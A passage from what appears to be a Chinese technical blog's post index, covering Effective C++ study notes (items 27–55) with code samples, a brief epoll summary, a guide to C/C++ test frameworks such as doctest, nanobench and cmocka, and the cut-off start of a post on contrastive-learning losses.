意图执行低级转型，实际运行情况取决于编译器，这也就表示它不可移植。例如将一个pointer to int转型为一个int。 static_cast 用来强迫隐式转换（implicit conversions），例如将non-const 对象转为 const 对象（条款3），或将 int 转为 double 等等。将 void* 指针转为某类型 typed 指针，将pointer-to-base转为pointer-to-derived。但它无法将const转为non-const——这个只有const_cast才办得到。 请记住： 如果可以，尽量避免转型，特别是在注重效率的代码中避免 dynamic_casts。如果有个设计需要转型动作，试着发展无需转型的替代设计。 如果转型是必要的，试着将它包装成某个函数。客户随后可以调用该函数，而不需将转型放进他们自己的代码内。 宁可使用C++-style（新式）转型，不要使用旧式转型。 条款28：避免返回handles指向对象内部成分 如果const成员函数传出一个reference指向成员变量，函数运行结果又被存储于对象外部，那么这个函数的调用者就可以通过reference修改对象的内部成员。 避免返回handles（包括references、指针、迭代器）指向对象内部。遵守这个条款可增加封装性，帮助 const 成员函数的行为像个 const，并将发生 dangling handles 的可能性降至最低。 条款29：为“异常安全”而努力是值得的 异常安全函数（Exception-safe functions）提供以下三个保证之一： 基本型保证：如果异常被抛出，程序内的任何事物仍然保持在有效状态下。 强烈型保证：如果异常被抛出，程序状态不改变。如果函数成功，就没有异常出现；如果函数失败，程序会回退到“调用函数之前”的状态。 不抛掷（nothrow）保证：承诺绝不抛出异常，因为它们总是能够完成它们其设计的功能。 异常安全码（Exception-safe code）必须提供上述三种保证之一。如果它不这样做，它就不具备异常安全性。 强烈型异常安全的一种实践：copy and swap。原则很简单：为你打算修改的对象做出一份副本，然后对副本做一切必要修改。若有任何修改动作抛出异常，原对象仍保持未改变状态。待所有改变都成功后，再将副本和原对象在一个不抛出异常的操作中置换（swap）。 异常安全函数（Exception-safe functions）即使发生异常也不会泄漏资源或允许任何数据结构败坏。 “强烈保证”往往能够以 copy-and-swap 实现出来，但“强烈保证”并非对所有函数都可实现或具备现实意义。 条款30：透彻了解inline的里里外外 将inline限制在小型、被频繁调用的函数身上。这可使日后的调试过程和二进制升级（binary upgradability）更容易，也可使潜在的代码膨胀问题最小化，使程序的速度提升机会最大化。 不要只因为function templates出现在头文件，就将它们声明为inline。 !!! important!!!: 现代C、C++编译器，会自动优化代码，程序中 inline 已经只算是一种提示符，并不具备编译层面上的绝对含义。所以，忘了它也无妨。 条款31：将文件间的编译依存关系降至最低 支持“编译依存性最小化”的一般构想是：依赖声明，不要依赖定义。 程序库头文件应该以“完全且仅有声明式”（full and declaration-onlyforms）的形式存在。这种做法不论是否涉及templates都适用。 六、继承与面向对象设计 条款32：确定你的public继承塑模出is-a关系 public inheritance 意味 \"is-a\" 的关系。适用于base classes身上的每一件事情一定也适用于derived classes身上，因为每一个derived class对象也都是一个base class对象。 条款33：避免覆盖继承而来的名称 为了让被遮掩的名称再见天日，可使用 using 声明式或转交函数（forwarding functions）。 1234567891011121314151617181920212223242526272829303132333435class Base &#123; int x;public: virtual void f1() = 0; virtual void f1(int); virtual void f2(); void f3(); void f3(double); virtual void f5(); ...&#125;;class Derievd: public Base &#123;public: using Base::f1; using Base::f3; virtual void f1(); void f3(); void f4(); // fowarding function virtual void f5() &#123; Base::f5(); &#125; ...&#125;;Derived d;int x = 1;d.f1(); // Derived::f1d.f1(x); // Base::f1d.f2(); // Base::f2d.f3(); // Derived::f3d.f3(x); // Base::f3d.f4(); // Derived::f4d.f5(); // Derived::f5, 转到Base::f5() 条款34：区分接口继承和实现继承 函数接口（function interfaces）继承和函数实现（functionimplementations）继承。 声明一个pure virtual函数的目的是为了让derived classes只继承函数接口。 声明简朴的（非纯）impure virtual函数的目的，是让derived classes继承该函数的接口和缺省实现，必要情况下，缺省实现可以单独设计为一个成员函数，而接口设计为pure virtual函数，防止缺省实现被误用。 声明non-virtual函数的目的是为了令derived classes继承函数的接口及一份强制性实现，比如设计每个对象都相同且必要的ID生成方法。 条款35：考虑virtual函数以外的其他选择 virtual函数的替代方案包括 NVI(Non-Virtual Interface) 手法及Strategy设计模式的多种形式。NVI手法自身是一个特殊形式的Template Method设计模式。 1234567891011121314// NVI(Non-Virtual Interface) class A &#123;public: int score() const &#123; // non-virtual, 子类不重载 ... int val = doScore(); ... return val; &#125;private: virtual int doScore() const &#123; // 子类重载 ... &#125;&#125;; 将功能从成员函数移到class外部函数，带来的一个缺点是，非成员函数无法访问class的non-public成员。 std::function 对象的行为就像一般函数指针。这样的对象可接纳，函数签名（target signature）一致的所有可调用对象（callable entities）。 1234567891011121314151617181920212223242526272829303132// declareclass Person;int defaultLearnStrategy(const Person&amp; pp);// definationclass Person &#123;public: typedef std::function&lt;int(const Person&amp;)&gt; learnStrat; explicit Person(learnStrat lst=defaultLearnStrategy): stratFunc(lst) &#123; ... &#125; int score() const &#123; return stratFunc(*this); &#125;private: learnStrat stratFunc;&#125;;int readStrategy(const Person&amp;) &#123; ...&#125;;int writeStrategy(const Person&amp;) &#123; ...&#125;;...Person p1(readStrategy);Person p2(writeStrategy);int score1 = p1.score();int score2 = p2.score(); 条款36：绝不重新定义继承而来的non-virtual函数 任何情况下都不该重新定义一个继承而来的non-virtual函数。 条款37：绝不重新定义继承而来的缺省参数值 绝对不要重新定义一个继承而来的virtual成员函数缺省参数值，因为缺省参数值都是静态绑定（statically bound），而virtual函数——你唯一应该覆写的东西——却是动态绑定（dynamically bound）。 静态绑定的问题，当父类指针指向子类对象，其静态类型就为父类。动态绑定，则会根据所指对象，解析动态类型为子类。 若子类重新定义一个继承而来的virtual成员函数缺省参数值，会静态解析为父类中的缺省参数值，而不是子类中重新定义的值。可能会导致一些不易排查的错误。 一种解决方法，是使用non-virtual实现父类的带缺省参数值的成员函数，调用一个virtual的功能成员，传入缺省参数值。子类只需要重载virtual的功能成员。 条款38：通过复合塑模出has-a关系 复合（composition）是类型之间的一种关系，指某种类型的对象内含其他类型的对象。 12345class A &#123; B component1; C component2; ...&#125;; 当复合发生于应用域内的对象之间，表现出has-a的关系；当它发生于实现域内则是表现is-implemented-in-terms-of的关系。 应用域指逻辑上的关联，比如电脑由存储系统、IO系统、计算系统等组成。实现域指一个类的实现中使用了buffer、mutex、binary search tree等技术手段。 条款39：明智而审慎地使用private继承 Private 继承意味 implemented-in-terms-of（根据某物实现出）。如果你让class D以private形式继承class B，你的用意是为了使用class B内某些特性和方法，不是因为B对象和D对象存在有任何观念上的关系。 private继承纯粹只是一种实现技术（继承自一个private base class的每样东西在你的class内都是private，因为它们都只是实现的细枝末节而已）。 Private继承在软件设计层面上没有意义，其意义只在于软件实现层面。 Private继承意味is-implemented-in-terms of（根据某物实现出）。它通常比复合（composition）的级别低。 和复合（composition）不同，private继承可以造成empty base最优化。这对致力于“对象尺寸最小化”的程序库开发者而言，可能很重要。 因为 empty class 始终会占用 1 字节的空间。若使用复合，那么加上alignment的影响，类的空间会存在一些浪费。 123456789101112131415class Defs &#123; typedef ... ...&#125;;// sizeof(A) == 8class A &#123; int x; Defs df;&#125;;// sizeof(B) == 4class B: private Defs &#123; int x; &#125;; 条款40：明智而审慎地使用多重继承 多重继承比单一继承复杂。它可能导致新的歧义性，以及对virtual继承的需要。 virtual继承会增加大小、速度、初始化（及赋值）复杂度等等成本。如果virtual base classes不带任何数据，将是最具实用价值的情况。 多重继承有其用途。比如，同时“public继承某个interface class”和“private继承某个协助实现的class”。 七、模板与泛型编程 条款41：了解隐式接口和编译期多态 面向对象编程世界总是以显式接口（explicit interface）和运行期多态（runtime polymorphism）解决问题。 Templates 及泛型编程的世界，与面向对象有根本上的不同。泛型编程中显式接口和运行期多态仍然存在，但重要性降低。反倒是隐式接口（implicit interfaces）和编译期多态（compile-time polymorphism）得到重视。 class 和 template 都支持接口（interfaces）和多态（polymorphism）。 对 class 而言接口是显式的（explicit），以函数签名为中心。多态则是通过virtual函数发生于运行期。 对 template 参数而言，接口是隐式的（implicit），它取决于T的具现化类型及其实现。多态则是通过template具现化和函数重载解析（function overloading resolution）发生于编译期。 条款42：了解typename的双重意义 template内出现的名称如果依赖某个template参数，称之为从属名称（dependent names）。 如果解析器在template中遭遇一个嵌套从属名称，它便假设这名称不是个类型，除非你明确指明它是个类型。 任何时候当你想要在template中指涉一个嵌套从属类型名称，就必须在它前面加上关键字 typename。 typename 不可以出现在 base classes list 内的嵌套从属类型名称之前，也不可在member initialization list（成员初值列）中作为base class修饰符。 声明template参数时，前缀关键字class和typename可互换。 标识嵌套从属类型名称时，请使用关键字typename；但不得在base class lists（基类列）或member initialization list（成员初值列）内以它作为base class修饰符。 123456789template&lt;typename T&gt;class Derived: public Base&lt;T&gt;::Nested &#123; // base class list 不允许typenamepublic: // member initialization list 不允许typename explicit Derived(int x): Base&lt;T&gt;::Nested(x) &#123; typename Base&lt;T&gt;::Nested temp; // dependent names &#125; ...&#125;; 条款43：学习处理模板化基类内的名称 可在derived class templates内通过 \"this-&gt;；\" 指涉base class template内的成员，而不只是在特化的class template中寻找成员。例如： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960template&lt;typename Company&gt;class MsgSender &#123;public: void send(const MsgInfo&amp; info) &#123;...&#125; void encryptedSend(const MsgInfo&amp; info) &#123;...&#125;&#125;;template&lt;&gt;class MsgSender&lt;CompanyK&gt; &#123;public: // 没有send void encryptedSend(const MsgInfo&amp; info) &#123;...&#125;&#125;;template&lt;typename Company&gt;class LogSender: public MsgSender&lt;Company&gt; &#123;public: void sendLog(const MsgInfo&amp; info) &#123; ... // 当 Company 为 CompanyK，出错 // 因为没有send，只是在MsgSender&lt;CompanyK&gt;中找成员 send(info); ... &#125;&#125;;// Solutiontemplate&lt;typename Company&gt;class LogSender: public MsgSender&lt;Company&gt; &#123;public: void sendLog(const MsgInfo&amp; info) &#123; ... // 可在 template&lt;typename Company&gt; class MsgSender 中找成员 this-&gt;send(info); ... &#125;&#125;;// 或者template&lt;typename Company&gt;class LogSender: public MsgSender&lt;Company&gt; &#123;public: // 告诉编译器 using MsgSender&lt;Company&gt;::send; void sendLog(const MsgInfo&amp; info) &#123; ... send(info); ... &#125;&#125;;// 或者template&lt;typename Company&gt;class LogSender: public MsgSender&lt;Company&gt; &#123;public: void sendLog(const MsgInfo&amp; info) &#123; ... // 明确指出 MsgSender&lt;Company&gt;::send(info); ... &#125;&#125; 条款44：将与参数无关的代码抽离 Templates生成多个classes和多个函数，所以任何template代码都不该与某个造成膨胀的template参数产生依赖关系。 因非类型模板参数（non-type template parameters，比如 n）而造成的代码膨胀，往往可消除，做法是以函数参数或class成员变量替换template参数。 123456template&lt;typename T, std::size_t n&gt;class Matrix &#123;public: void invert(); ...&#125;; 使用以上Matrix，其 Matrix&lt;int, 5&gt; 和 Matrix&lt;int, 10&gt; 会产生两套处理n不同，其他都类似的 invert 代码，造成代码膨胀。 1234567891011121314151617181920212223242526272829template&lt;typename T&gt;class MatrixBase &#123;protected: MatrixBase(std::size_t n, T* pMem): msize(n), pData(pMem) &#123; ... &#125; void setDataPtr(T* ptr) &#123;pData = ptr;&#125; void invert(std::size_t fsize) &#123; ... &#125; ...private: std::size_t msize; T* pData;&#125;;template&lt;typename T, std::size_t n&gt;class Matrix: private MatrixBase&lt;T&gt; &#123; using MatrixBase&lt;T&gt;::invert; // 使用Base的invertpublic: Matrix(): MatrixBase&lt;T&gt;(n, nullptr), pData(new T[n * n]) &#123; this-&gt;setDataPtr(pData.get()); &#125; void invert() &#123; this-&gt;invert(n); &#125; ...private: boost::scoped_array&lt;T&gt; pData;&#125;; 以上就只有一份 invert 代码，是一种解决方式。并且使用指针传递数据地址，进一步与 n 参数分离。 因类型参数（type parameters，比如 int、long等）而造成的代码膨胀，往往可降低，做法是让带有完全相同二进制表述（binary representations）的具现类型（instantiation types）共享实现码。比如，STL中，vector、list等，在实现操作强类型指针 T* 的成员函数时，都调用了一个操作 void* 的成员函数，由后者完成实际工作，避免代码膨胀。 条款45：运用成员函数模板接受所有兼容类型 请使用member function templates（成员函数模板）生成“可接受所有兼容类型”的函数。 如果你声明 member templates 用于“泛化copy构造”或“泛化assignment操作”，你还是需要声明正常的copy构造函数和copy assignment操作符。因为泛化copy构造并不会阻止编译器生成默认的copy构造函数。 123456789101112131415template&lt;class T&gt;class shared_ptr &#123;public: // copy constructor shared_ptr(const shared_ptr&amp; rhs); // templated copy constructor template&lt;class Y&gt; shared_ptr(const shared_ptr&lt;Y&gt;&amp; rhs); // copy assignment shared_ptr&amp; operator=(const shared_ptr&amp; rhs); // templated copy assignment template&lt;class Y&gt; shared_ptr&amp; operator=(const shared_ptr&lt;Y&gt;&amp; rhs); ...&#125; 条款46：需要类型转换时请为模板定义非成员函数 当我们编写一个class template，实现一个外部函数 function template，其所有参数需要进行class template的隐式类型转换时，请将这个外部函数定义为 class template 内部的 friend 函数。 因为 function template 在对实参进行类型推导时，从不考虑通过构造函数进行的隐式类型转换。 这里 friend 的作用不再是为了外部函数访问 class 的 non-public 部分，而是创建一个 non-member function ，以此来完成实参的类型的隐式转换。 123456789101112131415161718template&lt;class T&gt;const Rational&lt;T&gt; doMultiply(const Rational&lt;T&gt;&amp; lhs, const Rational&lt;T&gt;&amp; rhs); // declaretemplate&lt;class T&gt;class Rational &#123;public: // 完成模板具体化 friend const Rational&lt;T&gt; operator*(const Rational&lt;T&gt;&amp; lhs, const Rational&lt;T&gt;&amp; rhs) &#123; return doMultiply(lhs, rhs); &#125;&#125;;template&lt;class T&gt;const Rational&lt;T&gt; doMultiply(const Rational&lt;T&gt;&amp; lhs, const Rational&lt;T&gt;&amp; rhs) &#123; ...&#125; 条款47：请使用traits classes表现类型信息 STL中 iterator 的一个示例： 123456789template&lt;typename T&gt;struct __list_iterator &#123; typedef bidirectional_iterator_tag iterator_category; typedef T value_type; typedef T* pointer; typedef T&amp; reference; typedef ptrdiff_t difference_type; ...&#125;; trait class常见设计如下： 1234567891011121314151617181920212223242526272829303132//使用iterator提供的类型信息template&lt;typename Iterator&gt;struct iterator_traits&#123; typedef typename Iterator::iterator_category iterator_category; typedef typename Iterator::value_type value_typep; typedef typename Iterator::difference_type difference_type; typedef typename Iterator::pointer pointer; typedef typename Iterator::reference reference;&#125;;// 指针偏特化。template&lt;typename T&gt;struct iterator_traits&lt;T *&gt;&#123; typedef random_access_iterator_tag iterator_category; typedef T value_type; typedef ptrdiff_t difference_type; typedef T* pointer; typedef T&amp; reference;&#125;;// const指针偏特化template&lt;typename T&gt;struct iterator_traits&lt;const T *&gt;&#123; typedef random_access_iterator_tag iterator_category; typedef T value_type; typedef ptrdiff_t difference_type; typedef const T* pointer; typedef const T&amp; reference;&#125;; 常见使用： 1typedef typename iterator_traits&lt;Iterator&gt;::iterator_category category; iterator_traits 在编译期获取 iterator_category 等信息。 请记住： Traits classes使得“类型相关信息”在编译期可用。它们通过 templates 和 templates特化实现。 整合重载技术（overloading）后，traits classes 有可能在编译期对类型执行if...else测试。 条款48：认识template元编程 Template metaprogramming（TMP，模板元编程）是编写template-based C++程序并执行于编译期的过程。一旦TMP程序结束执行，其输出，也就是从 templates 具体生成的若干C++源码，便会一如往常地被编译。 一个 TMP 递归程序： 123456789101112template&lt;unsigned n&gt;struct Factorial &#123; enum &#123; value = n * Factorial&lt;n - 1&gt;::value &#125;;&#125;;template&lt;&gt;struct Factorial&lt;0&gt; &#123; enum &#123; value = 1 &#125;;&#125;;...int f6 = Factorial&lt;6&gt;::value; Template metaprogramming（TMP，模板元编程）可将工作由运行期移往编译期，因而得以实现早期错误侦测和更高的执行效率。 TMP 可被用来生成“基于策略选择组合”（based on combinations of policy choices）的定制代码，可用于实现多种设计模式，也可用来避免生成对某些特殊类型并不适合的代码。 八、定制new和delete 条款49：了解new-handler的行为 set_new_handler 允许客户指定一个函数，在内存分配无法获得满足时被调用。 nothrow new 是一个颇为局限的工具，因为它只适用于内存分配阶段；后续的构造函数调用还是可能抛出异常。 123456789101112void outOfMem() &#123; std::cerr &lt;&lt; \"Out of memory.\" &lt;&lt; std::endl; std::abort();&#125;int main() &#123; std::set_new_handler(outOfMem); // 失败返回 0 int *noArr = new(std::nothrow) int[100000000000L]; // outOfMem() 触发 int *arr = new int[100000000000L];&#125; 条款50：了解new和delete的合理替换时机 合理替换时机： 用来检测运用上的错误。如果我们自行定义一个 operator new，在申请的内存中写入特定的签名signatures。operator delete 检查上述签名是否原封不动，若否就表示在分配的内存区域中发生了 overrun 或 underrun，并记录log信息。 为了强化效能。对某些应用程序而言，将编译器自带的new和delete替换为定制版本，是提升效率的办法之一。 为了收集使用上的统计数据。 为了优化内存空间的分配、内存对齐优化等。 为了将关联数据结构尽量保存在连续的更少的内存页上，减少page fault。 条款51：编写new和delete时需固守常规 operator new 应该内含一个无穷循环，并在其中尝试分配内存，如果它无法满足内存需求，就该调用new_handler。它也应该有能力处理0 bytes申请。Class专属版本则还应该处理申请内存大小和class大小不匹配的情况，这通常是 derived class 没有实现 operator new 而调用了 base class 的 operator new 的情况。 operator delete 应该在收到null指针时不做任何事。Class专属版本则还应该处理申请内存大小和class大小不匹配的情况。 12345678910111213141516171819202122232425262728293031323334class Base &#123;public: static void* operator new(std::size_t size) throw(std::bad_alloc); static void operator delete(void* rawMem, std::size_t size) throw(); ...&#125;;void* Base::operator new(std::size_t size) throw(std::bad_alloc) &#123; if (size != sizeof(Base)) return ::operator new(size); //使用std中标准new if (size == 0) size = 1; // 一种处理方法，始终返回合法指针 while (true) &#123; 分配内存; if 分配成功 return 指针 // 以下只是为了取得 new_handler 函数指针 std::new_handler gHandler = std::set_new_handler(0); std::set_new_handler(gHandler); if (gHandler) (*gHandler)(); else throw std::bad_alloc(); &#125;&#125;void Base::operator delete(void* rawMem, std::size_t size) throw() &#123; if (rawMem == 0) return; if (size != sizeof(Base)) &#123; ::operator delete(rawMem); return; &#125; 回收内存; return;&#125; 条款52：写了placement new也要写placement delete 如果operator new接受的参数不止size_t，那就是 placement new。众多 placement new 版本中特别有用的一个是“接受一个指针指向对象该被构造之处”。 一个带额外参数的 operator new，需要带相同额外参数的对应版operator delete。 要防止内存泄漏，必须同时提供一个正常的operator delete，用于构造期间无任何异常被抛出，和一个 placement delete 版本，用于构造期间有异常被抛出。后者的额外参数必须和operator new一样。 当你写一个 placement operator new，也需要写对应的 placement operator delete。如果没有，你的程序可能会发生内存泄漏。 当你声明 placement new 和placement delete，考虑是否有必要覆盖它们的正常（全局默认）版本。 1234567891011121314151617181920212223242526272829303132333435class StandardNewDelete &#123;public: // 使用全局默认的 new/delete static void* operator new(std::size_t size) throw(std::bad_alloc) &#123; return ::operator new(size); &#125; static void operator delete(void* pMem) throw() &#123; ::operator delete(pMem); &#125; // 使用全局默认的 placement new/placement delete static void* operator new(std::size_t size, void* ptr) throw() &#123; return ::operator new(size, ptr); &#125; static void operator delete(void* pMem, void* ptr) throw() &#123; ::operator delete(pMem, ptr); &#125; // 使用全局默认的 nothrow new/nothrow delete static void* operator new(std::size_t size, const std::nothrow_t&amp; nt) throw() &#123; return ::operator new(size, nt); &#125; static void operator delete(void* pMem, const std::nothrow_t&amp; nt) throw() &#123; ::operator delete(pMem); &#125;&#125;// 增加自定义形式class Derived: public StandardNewDelete &#123;public: // 防止标准 new/delete 被覆盖 using StandardNewDelete::operator new; using StandardNewDelete::operator delete; // 追加自定义 placement new/placement delete static void* operator new(std::size_t size, std::ostream&amp; logStream) throw(std::bad_alloc); static void operator delete(void* pMem, std::ostream&amp; logStream) throw();&#125; 九、杂项讨论 条款53：不要轻忽编译器的警告 严肃对待编译器发出的警告信息。努力在编译器的最高警告级别下争取“无任何警告”。 不同的编译器处理方式并不相同。 条款54：让自己熟悉标准程序库 C++标准程序库的主要功能由STL、iostreams、locales组成。 熟悉智能指针、函数指针、hash-based容器、正则表达式（regular expressions）等。 条款55：让自己熟悉Boost Boost致力于免费、源码开放、同僚复审的C++程序库开发。Boost在C++标准化过程中扮演深具影响力的角色。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Book","slug":"Book","permalink":"https://racleray.github.io/tags/Book/"}],"author":"HeRui"},{"title":"epoll简述","slug":"epoll简述","date":"2022-03-02T16:02:59.000Z","updated":"2024-01-09T05:01:58.427Z","comments":true,"path":"posts/d207ef0b.html","link":"","permalink":"https://racleray.github.io/posts/d207ef0b.html","excerpt":"一图流简易epoll实现机制","text":"epoll实现机制粗糙版总结。 Level-triggered VS Edge-triggered 两种模式在实现中的不同之处在于： 在 ep_send_events_proc 函数（ep_send_events中的一个回调函数）的中，如果是 level-triggered 模式，当前的 epoll_item 对象被重新加到 eventpoll 的就绪列表 ready list 中，这样在下一次 epoll_wait 调用时，这些 epoll_item 对象就会被重新处理。而 edge-triggered 模式，不会重新加入。 另外，引用一篇优质blog select、poll、epoll - IO模型超详解。基础概念和基础使用等的信息，直接搜索，不再重复写这里了。 在上面引用的blog中，有一张关于 epoll 机制更抽象一点的图，放一起方便对比。但是该作者有一处错误，关于mmap说明。 这里对 mmap 得说明是错误的。并不是只有块设备才可以进行 mmap 内存映射。 所以上图中的解释是错误的。按我的认知来讲，这里没有将事件链表进行内存映射，至少不是设备类型的原因。 rdlist 链表中的事件是会被复制到用户空间的。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Computer Network","slug":"Notes/Computer-Network","permalink":"https://racleray.github.io/categories/Notes/Computer-Network/"}],"tags":[{"name":"epoll","slug":"epoll","permalink":"https://racleray.github.io/tags/epoll/"}],"author":"HeRui"},{"title":"C/C++测试框架","slug":"C-Cpp测试框架","date":"2022-01-23T12:59:29.000Z","updated":"2023-09-23T13:57:26.173Z","comments":true,"path":"posts/aeaec6fb.html","link":"","permalink":"https://racleray.github.io/posts/aeaec6fb.html","excerpt":"测试框架：catch2、doctes、googletest、cmocka","text":"框架 Head only catch2 doctest Compile googletest C 测试框架： cmocka doctest 轻量 编译速度快（相比于 catch2） API友好 功能丰富，支持对模板批量测试 使用 CMake 配置时，确保编译的目标文件找得到 doctest 的头文件即可。 1234include_directories('path to doctest.h')# 或者target_include_directories($&#123;target_name&#125; PUBLIC 'path to doctest.h') 断言宏等级划分： REQUIRE：这个等级算是最高的，如果断言失败，不仅会标记为测试不通过，而且会强制退出测试。 CHECK：如果断言失败，标记为测试不通过，但不会强制退出，会继续执行。 WARN：如果断言失败，不会标记为测试不通过，也不会强制退出，但是会给出对应的提示。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// build test subcases like a tree.// run: 1--2--end 1--3--end two subroutines.TEST_CASE(\"vectors can be sized and resized\") &#123; std::vector&lt;int&gt; v(5); // 1 REQUIRE(v.size() == 5); REQUIRE(v.capacity() &gt;= 5); SUBCASE(\"adding to the vector increases it's size\") &#123; // 2 v.push_back(1); CHECK(v.size() == 6); CHECK(v.capacity() &gt;= 6); &#125; SUBCASE(\"reserving increases just the capacity\") &#123; // 3 v.reserve(6); CHECK(v.size() == 5); CHECK(v.capacity() &gt;= 6); &#125;&#125;// Group the test cases.TEST_SUITE(\"math\") &#123; TEST_CASE(\"\") &#123;&#125; // part of the math test suite TEST_CASE(\"\") &#123;&#125; // part of the math test suite&#125;// Test template.TEST_CASE_TEMPLATE(\"test std::any as integer\", T, char, short, int, long long int) &#123; auto v = T(); std::any var = T(); CHECK(std::any_cast&lt;T&gt;(var) == v);&#125;TEST_CASE_TEMPLATE(\"test std::any as string\", T, const char *, std::string_view, std::string) &#123; T v = \"hello world\"; std::any var = v; CHECK(std::any_cast&lt;T&gt;(var) == v);&#125;TEST_CASE(\"infos\") &#123; REQUIRE(\"foobar\" == doctest::Contains(\"foo\")); CHECK_MESSAGE(2 == 1, \"not valid\"); REQUIRE(22.0 / 7 == doctest::Approx(3.141).epsilon(0.01)); // allow for a 1% error&#125; nanobench nanobench 12345678910111213141516include(FetchContent)FetchContent_Declare( nanobench GIT_REPOSITORY https://github.com/martinus/nanobench.git GIT_TAG v4.1.0 GIT_SHALLOW TRUE)FetchContent_MakeAvailable(nanobench)...# 目标文件链接target_link_libraries($&#123;target_name&#125; PRIVATE nanobench) 12345678910#include &lt;nanobench.h&gt;#include &lt;atomic&gt;int main() &#123; int y = 0; std::atomic&lt;int&gt; x(0); ankerl::nanobench::Bench().run(\"compare_exchange_strong\", [&amp;] &#123; x.compare_exchange_strong(y, 0); &#125;);&#125; 输出结果 ns/op op/s err% total benchmark 9.07 110,254,890.34 0.0% 0.00 compare_exchange_strong ns/op：每个bench内容需要经历的时间（ns为单位） op/s：每秒可以执行多少次操作 err%：运行多次测试的波动情况（误差） ins/op：每次操作需要多少条指令 cyc/op：每次操作需要多少次时钟周期 bra/op：每次操作有多少次分支预判 miss%：分支预判的miss率 total：本次消耗的总时间 benchmark：\"compare_exchange_strong\" 自定义测试名称 可测 BigO 时间复杂度： 123456789101112131415161718192021222324252627282930313233343536#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN#include &lt;doctest.h&gt;#include &lt;nanobench.h&gt;#include &lt;iostream&gt;#include &lt;atomic&gt;#include &lt;set&gt;TEST_CASE(\"tutorial_complexity_set_find\") &#123; // Create a single benchmark instance that is used in multiple benchmark // runs, with different settings for complexityN. ankerl::nanobench::Bench bench; // a RNG to generate input data ankerl::nanobench::Rng rng; std::set&lt;uint64_t&gt; set; // Running the benchmark multiple times, with different number of elements for (auto setSize : &#123;10U, 20U, 50U, 100U, 200U, 500U, 1000U, 2000U, 5000U, 10000U&#125;) &#123; // fill up the set with random data while (set.size() &lt; setSize) &#123; set.insert(rng()); &#125; // Run the benchmark, provide setSize as the scaling variable. bench.complexityN(set.size()).run(\"std::set find\", [&amp;] &#123; ankerl::nanobench::doNotOptimizeAway(set.find(rng())); &#125;); &#125; // calculate BigO complexy best fit and print the results std::cout &lt;&lt; bench.complexityBigO() &lt;&lt; std::endl;&#125; 可使用 pyperf 解析结果： 12345678910111213141516171819202122232425262728#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN#include &lt;doctest.h&gt;#include &lt;nanobench.h&gt;#include &lt;algorithm&gt;#include &lt;fstream&gt;#include &lt;atomic&gt;#include &lt;random&gt;TEST_CASE(\"shuffle_pyperf\") &#123; std::vector&lt;uint64_t&gt; data(500, 0); // input data for shuffling // NOLINTNEXTLINE(cert-msc32-c,cert-msc51-cpp) std::default_random_engine defaultRng(123); std::ofstream fout1(\"pyperf_shuffle_std.json\"); ankerl::nanobench::Bench() .epochs(100) .run(\"std::shuffle with std::default_random_engine\", [&amp;]() &#123; std::shuffle(data.begin(), data.end(), defaultRng); &#125;) .render(ankerl::nanobench::templates::pyperf(), fout1); std::ofstream fout2(\"pyperf_shuffle_nanobench.json\"); ankerl::nanobench::Rng rng(123); ankerl::nanobench::Bench() .epochs(100) .run(\"ankerl::nanobench::Rng::shuffle\", [&amp;]() &#123; rng.shuffle(data); &#125;) .render(ankerl::nanobench::templates::pyperf(), fout2);&#125; 1python3 -m pyperf stats pyperf_shuffle_std.json cmocka API文档。但是建议结合 source code 中的示例程序，了解 cmocka 的使用。 项目下新建文件夹 cmocka ，添加以下 .cmake 文件： 12345678910111213141516include(FetchContent)FetchContent_Declare( cmocka GIT_REPOSITORY https://git.cryptomilk.org/projects/cmocka.git GIT_TAG cmocka-1.1.7 GIT_SHALLOW 1)set(WITH_STATIC_LIB ON CACHE BOOL \"CMocka: Build with a static library\" FORCE)set(WITH_CMOCKERY_SUPPORT OFF CACHE BOOL \"CMocka: Install a cmockery header\" FORCE)set(WITH_EXAMPLES OFF CACHE BOOL \"CMocka: Build examples\" FORCE)set(UNIT_TESTING ON CACHE BOOL \"CMocka: Build with unit testing\" FORCE)set(PICKY_DEVELOPER OFF CACHE BOOL \"CMocka: Build with picky developer flags\" FORCE)FetchContent_MakeAvailable(cmocka) 项目根目录下的 CMakeLists.txt 中： 123456789include(cmake/FetchCMocka.cmake)# 添加编译目标add_executable(CMockaExample test.c)target_compile_features(CMockaExample PRIVATE c_std_99)target_link_libraries(CMockaExample PRIVATE cmocka-static)enable_testing()add_test(NAME CMockaExample COMMAND CMockaExample) 12345678910111213141516171819#include &lt;stdarg.h&gt;#include &lt;setjmp.h&gt;#include &lt;stddef.h&gt;#include &lt;cmocka.h&gt;static void test(void **state)&#123; assert_int_equal(2, 2);&#125;int main()&#123; const struct CMUnitTest tests[] = &#123; cmocka_unit_test(test), &#125;; return cmocka_run_group_tests(tests, NULL, NULL);&#125;","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"C","slug":"Tools/C","permalink":"https://racleray.github.io/categories/Tools/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"C","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"测试框架","slug":"测试框架","permalink":"https://racleray.github.io/tags/%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/"}],"author":"HeRui"},{"title":"对比学习损失使用","slug":"对比学习损失使用","date":"2021-11-03T14:52:53.000Z","updated":"2023-08-07T12:02:23.619Z","comments":true,"path":"posts/39bd8d48.html","link":"","permalink":"https://racleray.github.io/posts/39bd8d48.html","excerpt":"简单记录两种对比学习损失的简单使用，以及计算方法。","text":"对于自监督学习，一般分为两种。一种是AutoEncoder这种通过一个表征向量，从自己到自己的还原过程，这类称为生成式自监督学习。一种是以学习区分两种不同类事物的关键特征为目标，通过构建正负例子，学习表征向量的方法，这类称为判别式自监督学习，也叫做对比学习。 对比学习的通过互信息，衡量一个表征的好坏，与正例相似而远离负例。这里记录两个常用的对比学习损失。 NTXentLoss NTXentLoss也就是InfoNCE使用的损失： \\[ L = -log \\frac{exp(q \\cdot k_+ / 